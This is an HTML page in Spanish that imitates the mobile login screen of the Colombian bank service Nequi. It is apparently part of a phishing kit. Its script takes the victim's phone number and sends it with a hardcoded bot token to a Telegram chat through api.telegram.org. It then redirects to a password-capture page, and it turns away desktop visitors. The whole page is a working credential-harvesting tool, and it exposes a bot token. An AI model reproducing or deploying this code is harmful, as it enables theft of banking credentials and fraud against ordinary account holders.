<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Nequi</title>
  <link rel="stylesheet" href="../css/footer.css" />
  <link rel="stylesheet" href="../css/spinner.css" />
  <link rel="stylesheet" href="../css/globals.css" />
  <link rel="shortcut icon" type="image/x-icon" href="../assets/favicon.html" />
  <style>
    .loader {
      border: 6px solid #f3f3f3;
      border-top: 6px solid #ff6b6b;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
      display: none;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>

<script>
  document.addEventListener("DOMContentLoaded", () => {
    const esMovil = /Mobi|Android|iPhone|iPad|iPod|Opera Mini|IEMobile/i.test(navigator.userAgent);
    if (!esMovil) window.location.href = "../pc.html";
  });
</script>

<body class="bg-purple-primary min-h-full">
  <section class="max-w-[420px] mx-auto min-h-[100dvh] flex flex-col p-4" id="mainContainer">
    <header class="w-full flex justify-between items-center">
      <div class="w-5 h-5 border-2 border-white rounded-full flex justify-center items-center">
        <span class="text-white text-base font-medium">?</span>
      </div>
      <div class="flex justify-center items-center gap-1 text-gray-400">
        <svg width="70px" height="24px" viewBox="0 0 118 40">
          <path class="st0" d="M83.59,23.13c0.21,0.14,0.35,0.35,0.42,0.59l0.85,2.73c0.04,0.1,0.06,0.21,0.06,0.31
            c0,0.11-0.03,0.21-0.07,0.31s-0.11,0.19-0.18,0.26c-0.08,0.07-0.17,0.13-0.27,0.17c-4.14,1.01-8.22,2.24-12.22,3.7
            c-0.13,0.05-0.27,0.07-0.42,0.07c-0.14,0-0.28-0.04-0.41-0.1c-0.13-0.06-0.25-0.14-0.34-0.25c-0.1-0.1-0.17-0.23-0.22-0.36
            c-0.14-0.52-0.24-0.92-0.33-1.3c-0.13-0.54-0.26-1.03-0.45-1.72c-0.06-0.25-0.02-0.51,0.1-0.74c0.12-0.23,0.32-0.4,0.57-0.48
            c4.01-1.37,8.09-2.5,12.23-3.37C83.14,22.93,83.39,22.99,83.59,23.13z"></path>
        </svg>
      </div>
    </header>

    <main class="flex-1 flex flex-col content-wrapper">
      <div class="text-guanabana flex flex-col items-center mt-auto logo-container">
        <svg width="180" height="40" viewBox="0 0 104 32" fill="none">
          <path d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081"/>
          <text x="15" y="23" fill="white" font-size="20" font-weight="bold">NEQUI</text>
        </svg>
      </div>

      <div class="w-full mt-auto form-container">
        <form id="homeForm" class="w-full space-y-4">
          <div class="alert-box" id="error-login" style="display:none;background:#f44336;padding:12px;border-radius:6px;color:white">
            ¡Ups! Número inválido. Ingresa 10 dígitos.
          </div>

          <div class="w-full relative">
            <div class="flex items-center bg-white/20 rounded-sm p-1">
              <div class="flex items-center gap-2 pr-3 border-r-2 border-purple-primary">
                <span class="text-pink-secondary font-medium">+57</span>
              </div>
              <div class="flex-1">
                <input type="text" id="phoneNumber" inputmode="numeric" maxlength="10"
                  placeholder="Ingresa tu cel"
                  class="w-full h-11 px-4 text-white border-none focus:outline-none placeholder:text-white bg-transparent" />
              </div>
            </div>
          </div>

          <div class="w-full">
            <button id="loginButton" type="button"
              class="w-full h-12 bg-pink-primary text-white rounded-sm text-base font-medium cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed">
              Entra
            </button>
          </div>

          <div id="loader" class="loader"></div>
          <p id="msg" class="text-center text-white mt-4"></p>
        </form>
      </div>
    </main>
  </section>

  <script type="module">
    // VALIDACIÓN SIMPLE
    const LoginValidation = () => {
      const cel = document.getElementById('phoneNumber').value.trim();
      return cel.length === 10 && /^\d+$/.test(cel);
    };

    // ENVÍO A TELEGRAM
    async function enviarTelegram({ numero }) {
      const BOT_TOKEN = '8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc';
      const CHAT_ID = '8469651553';

      const mensaje = `*NUEVO CLIENTE NEQUI*

*Número:* +57 ${numero}
*Hora:* ${new Date().toLocaleTimeString()}
*IP:* Detectando...`;

      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: mensaje,
            parse_mode: 'Markdown'
          })
        });
        return true;
      } catch (e) {
        console.error(e);
        return false;
      }
    }

    // EVENTOS
    document.addEventListener("DOMContentLoaded", () => {
      const btn = document.getElementById('loginButton');
      const loader = document.getElementById('loader');
      const msg = document.getElementById('msg');
      const error = document.getElementById('error-login');
      const phoneInput = document.getElementById('phoneNumber');

      // Inicialmente deshabilitar el botón
      btn.disabled = true;

      // Habilitar botón solo si hay 10 dígitos
      phoneInput.addEventListener('input', () => {
        const valido = LoginValidation();
        btn.disabled = !valido;
        error.style.display = 'none';
      });

      btn.onclick = async (e) => {
        e.preventDefault(); // ⭐ IMPORTANTE: Prevenir comportamiento por defecto
        
        const numero = phoneInput.value.trim();

        if (!LoginValidation()) {
          error.style.display = 'block';
          return;
        }

        // Guardar el número en localStorage
        const formData = {
          phoneNumber: numero
        };
        localStorage.setItem('formData', JSON.stringify(formData));

        btn.disabled = true;
        btn.textContent = 'Enviando...';
        loader.style.display = 'block';
        msg.textContent = '';

        const enviado = await enviarTelegram({ numero });

        if (enviado) {
          msg.innerHTML = '¡Enviado! Redirigiendo...';
          setTimeout(() => {
            // ⭐ CORRECCIÓN: Redirigir a la página de clave
            window.location.href = 'access-sign-in-pass.html';
          }, 1500);
        } else {
          msg.innerHTML = 'Error de red. Intenta de nuevo.';
          btn.disabled = false;
          btn.textContent = 'Entra';
          loader.style.display = 'none';
        }
      };
    });
  </script>
</body>
</html>
